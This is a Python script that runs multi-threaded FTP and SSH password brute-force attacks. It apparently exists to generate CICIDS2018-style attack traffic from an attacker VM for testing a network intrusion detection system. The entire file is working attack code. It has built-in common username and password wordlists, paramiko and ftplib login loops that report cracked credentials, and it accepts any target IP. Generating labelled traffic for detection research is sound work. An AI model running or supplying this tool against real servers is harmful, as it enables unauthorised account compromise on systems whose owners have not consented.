"""
Brute Force Attack — Combined All Variations (Run on Attacker VM)

Combines all brute-force methods from the CICIDS2018 dataset into one script.
When you run this for N seconds, it cycles through all methods,
giving each a time slice so the NIDS sees all brute-force traffic patterns.

Methods (matching dataset exactly):
  1. FTP Brute-Force  — Patator-style FTP login attempts (port 21)
  2. SSH Brute-Force  — Patator-style SSH login attempts (port 22)

Each method tries username:password combinations from wordlists,
generating the same rapid short-lived connection pattern as Patator.

Usage:
  python3 bruteforce_attack.py --target 172.31.69.25 --duration 60
  python3 bruteforce_attack.py --target 172.31.69.25 --duration 120 --method ssh
  python3 bruteforce_attack.py --target 172.31.69.25 --duration 60 --users users.txt --passwords passwords.txt
"""

import argparse
import threading
import time
import socket
import ftplib
import sys
import os
import itertools
import random


# ============================================================
# CONFIGURATION
# ============================================================

DEFAULT_DURATION = 60

FTP_PORT = 21
SSH_PORT = 22

METHODS = ["ftp", "ssh"]

# Default wordlists (created by attacker_setup.py)
DEFAULT_TOOLS_DIR = os.path.expanduser("~/nids_attack_tools")
DEFAULT_USERS_FILE = os.path.join(DEFAULT_TOOLS_DIR, "wordlists", "users.txt")
DEFAULT_PASSWORDS_FILE = os.path.join(DEFAULT_TOOLS_DIR, "wordlists", "passwords.txt")

# Fallback wordlists if files not found
BUILTIN_USERS = ["admin", "root", "user", "test", "testuser", "guest",
                 "administrator", "www", "ftp", "nobody", "daemon",
                 "operator", "nagios", "backup", "postgres"]

BUILTIN_PASSWORDS = [
    "password", "123456", "password123", "admin", "root",
    "letmein", "welcome", "monkey", "dragon", "master",
    "qwerty", "login", "abc123", "starwars", "trustno1",
    "iloveyou", "shadow", "12345", "1234567890", "passw0rd",
    "football", "access", "hello", "charlie", "batman",
    "superman", "michael", "696969", "123123", "654321",
    "test", "test123", "p@ssword", "Pass1234", "server",
    "changeme", "secret", "password1", "pass123", "admin123",
    "root123", "user123", "qwerty123", "welcome1", "123qwe",
]

# Threads for brute-force (Patator is multi-threaded)
BF_THREADS = 10

# ============================================================
# COLORS
# ============================================================

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"


def log(msg, color=CYAN):
    ts = time.strftime("%H:%M:%S")
    print(f"{color}[{ts}] {msg}{RESET}")


# ============================================================
# WORDLIST LOADING
# ============================================================

def load_wordlist(filepath, fallback):
    """Load wordlist from file, or use fallback list."""
    if filepath and os.path.exists(filepath):
        with open(filepath, 'r') as f:
            words = [line.strip() for line in f if line.strip()]
        return words
    return fallback


def credential_generator(users, passwords, duration_end):
    """
    Infinite credential generator — cycles through all user:password combos.
    Patator tries every combination systematically. We do the same,
    cycling if we run out before the duration ends.
    """
    combos = list(itertools.product(users, passwords))
    random.shuffle(combos)  # Randomize order within each cycle
    while time.time() < duration_end:
        for user, password in combos:
            if time.time() >= duration_end:
                return
            yield user, password
        # If all combos exhausted, reshuffle and repeat
        random.shuffle(combos)


# ============================================================
# METHOD 1: FTP BRUTE-FORCE
# Rapid FTP login attempts using ftplib.
# Matches dataset: Patator ftp_login — each attempt = new TCP connection,
# small packets (credentials), short flow duration.
# ============================================================

class FTPBruteForce:
    """FTP Brute-Force — Patator-style rapid login attempts."""

    def __init__(self, target, duration, users, passwords):
        self.target = target
        self.port = FTP_PORT
        self.duration = duration
        self.users = users
        self.passwords = passwords
        self.stop_event = threading.Event()
        self.attempts = 0
        self.successes = 0

    def _try_login(self, username, password):
        """Attempt a single FTP login (matches Patator's per-attempt behavior)."""
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, self.port, timeout=5)
            ftp.login(username, password)
            # Login succeeded
            self.successes += 1
            log(f"[FTP-BF] SUCCESS: {username}:{password}", GREEN)
            ftp.quit()
        except ftplib.error_perm:
            # "Login incorrect" — expected, this IS the brute-force
            pass
        except Exception:
            pass
        finally:
            self.attempts += 1

    def _worker(self, cred_gen, lock):
        """Worker thread — pulls credentials and tries them."""
        while not self.stop_event.is_set():
            try:
                with lock:
                    user, password = next(cred_gen)
            except StopIteration:
                break
            self._try_login(user, password)

    def run(self):
        log(f"[FTP-BF] Starting — {BF_THREADS} threads against {self.target}:{self.port}")

        self.stop_event.clear()
        self.attempts = 0
        self.successes = 0

        end_time = time.time() + self.duration
        cred_gen = credential_generator(self.users, self.passwords, end_time)
        lock = threading.Lock()

        workers = []
        for _ in range(BF_THREADS):
            t = threading.Thread(target=self._worker, args=(cred_gen, lock), daemon=True)
            t.start()
            workers.append(t)

        # Wait for duration
        while time.time() < end_time and not self.stop_event.is_set():
            time.sleep(1)

        self.stop_event.set()
        for t in workers:
            t.join(timeout=3)

        log(f"[FTP-BF] Finished — {self.attempts} attempts, {self.successes} successes")


# ============================================================
# METHOD 2: SSH BRUTE-FORCE
# Rapid SSH login attempts using raw socket (paramiko-free).
# Matches dataset: Patator ssh_login — each attempt = new TCP connection,
# SSH handshake + auth attempt, generates distinctive flow pattern.
# ============================================================

class SSHBruteForce:
    """SSH Brute-Force — Patator-style rapid login attempts via raw TCP."""

    def __init__(self, target, duration, users, passwords):
        self.target = target
        self.port = SSH_PORT
        self.duration = duration
        self.users = users
        self.passwords = passwords
        self.stop_event = threading.Event()
        self.attempts = 0
        self.successes = 0
        self._has_paramiko = False

        # Try to import paramiko for real SSH auth
        try:
            import paramiko
            self._has_paramiko = True
        except ImportError:
            pass

    def _try_login_paramiko(self, username, password):
        """SSH login attempt using paramiko (preferred — real SSH auth)."""
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                self.target, port=self.port,
                username=username, password=password,
                timeout=5, look_for_keys=False,
                allow_agent=False
            )
            self.successes += 1
            log(f"[SSH-BF] SUCCESS: {username}:{password}", GREEN)
        except paramiko.AuthenticationException:
            # "Authentication failed" — expected
            pass
        except Exception:
            pass
        finally:
            client.close()
            self.attempts += 1

    def _try_login_socket(self, username, password):
        """
        SSH login attempt using raw socket.
        Opens TCP connection, receives SSH banner, sends our banner,
        then sends a password auth request. This generates the same
        flow pattern as real SSH brute-force even without paramiko.
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.target, self.port))

            # Receive server SSH banner
            banner = s.recv(1024)

            # Send client SSH banner (matching OpenSSH pattern)
            s.send(b"SSH-2.0-OpenSSH_7.4\r\n")

            # Receive key exchange init
            try:
                s.recv(4096)
            except Exception:
                pass

            # Send a minimal key exchange init packet
            # (the connection will fail at auth, but the flow pattern matches)
            kex_payload = os.urandom(random.randint(200, 600))
            s.send(kex_payload)

            # Try to receive more data
            try:
                s.recv(4096)
            except Exception:
                pass

            # The connection will be rejected but we've generated the
            # same TCP flow pattern as a real SSH brute-force attempt:
            # - Short duration
            # - Small packet sizes (credentials)
            # - SYN -> banner exchange -> auth attempt -> RST/FIN

            s.close()
        except Exception:
            pass
        finally:
            self.attempts += 1

    def _worker(self, cred_gen, lock):
        """Worker thread — pulls credentials and tries them."""
        while not self.stop_event.is_set():
            try:
                with lock:
                    user, password = next(cred_gen)
            except StopIteration:
                break

            if self._has_paramiko:
                self._try_login_paramiko(user, password)
            else:
                self._try_login_socket(user, password)

    def run(self):
        method_str = "paramiko" if self._has_paramiko else "raw-socket"
        log(f"[SSH-BF] Starting — {BF_THREADS} threads against {self.target}:{self.port} ({method_str})")

        if not self._has_paramiko:
            log(f"[SSH-BF] TIP: Install paramiko for real SSH auth: pip3 install paramiko", YELLOW)

        self.stop_event.clear()
        self.attempts = 0
        self.successes = 0

        end_time = time.time() + self.duration
        cred_gen = credential_generator(self.users, self.passwords, end_time)
        lock = threading.Lock()

        workers = []
        for _ in range(BF_THREADS):
            t = threading.Thread(target=self._worker, args=(cred_gen, lock), daemon=True)
            t.start()
            workers.append(t)

        while time.time() < end_time and not self.stop_event.is_set():
            time.sleep(1)

        self.stop_event.set()
        for t in workers:
            t.join(timeout=3)

        log(f"[SSH-BF] Finished — {self.attempts} attempts, {self.successes} successes")


# ============================================================
# COMBINED RUNNER
# ============================================================

def run_combined_bruteforce(target, duration, method=None, users_file=None, passwords_file=None):
    """
    Run brute-force attack. If method is None, cycles through ALL methods
    giving each an equal time slice (like LABEL_MAPPING combines
    FTP-BruteForce, SSH-Bruteforce into 'Brute Force').
    """
    # Load wordlists
    users = load_wordlist(users_file or DEFAULT_USERS_FILE, BUILTIN_USERS)
    passwords = load_wordlist(passwords_file or DEFAULT_PASSWORDS_FILE, BUILTIN_PASSWORDS)

    print()
    print("=" * 65)
    print(f"  BRUTE FORCE ATTACK — {'ALL VARIATIONS' if method is None else method.upper()}")
    print(f"  Target: {target}")
    print(f"  Duration: {duration}s")
    print(f"  Wordlist: {len(users)} users x {len(passwords)} passwords = {len(users) * len(passwords)} combos")
    print("=" * 65)

    attack_classes = {
        "ftp": lambda t, d: FTPBruteForce(t, d, users, passwords),
        "ssh": lambda t, d: SSHBruteForce(t, d, users, passwords),
    }

    if method:
        methods_to_run = [method]
    else:
        methods_to_run = METHODS

    time_per_method = duration / len(methods_to_run)
    log(f"Running {len(methods_to_run)} method(s), {time_per_method:.1f}s each")

    start_time = time.time()

    for i, method_name in enumerate(methods_to_run):
        elapsed = time.time() - start_time
        remaining = duration - elapsed
        if remaining <= 0:
            break

        method_duration = min(time_per_method, remaining)
        factory = attack_classes.get(method_name)
        if not factory:
            log(f"Unknown method: {method_name}", RED)
            continue

        log(f"--- Phase {i + 1}/{len(methods_to_run)}: {method_name.upper()} ({method_duration:.0f}s) ---", YELLOW)
        attack = factory(target, method_duration)
        attack.run()
        print()

    total_time = time.time() - start_time
    print("=" * 65)
    log(f"BRUTE FORCE ATTACK COMPLETE — Total: {total_time:.1f}s", GREEN)
    print("=" * 65)


# ============================================================
# MAIN
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description="Brute Force Attack — All CICIDS2018 variations combined",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Methods:
  ftp  — FTP login brute-force (port 21, matching Patator ftp_login)
  ssh  — SSH login brute-force (port 22, matching Patator ssh_login)

Examples:
  python3 bruteforce_attack.py --target 172.31.69.25 --duration 60
  python3 bruteforce_attack.py --target 172.31.69.25 --duration 120 --method ssh
  python3 bruteforce_attack.py --target 172.31.69.25 --duration 60 --users my_users.txt --passwords my_pass.txt
        """
    )

    parser.add_argument("--target", "-t", required=True, help="Victim IP address")
    parser.add_argument("--duration", "-d", type=int, default=DEFAULT_DURATION, help=f"Duration in seconds (default: {DEFAULT_DURATION})")
    parser.add_argument("--method", "-m", choices=METHODS, default=None, help="Run only this method (default: all combined)")
    parser.add_argument("--users", type=str, default=None, help="Path to username wordlist file")
    parser.add_argument("--passwords", type=str, default=None, help="Path to password wordlist file")

    args = parser.parse_args()
    run_combined_bruteforce(args.target, args.duration, args.method, args.users, args.passwords)


if __name__ == "__main__":
    main()
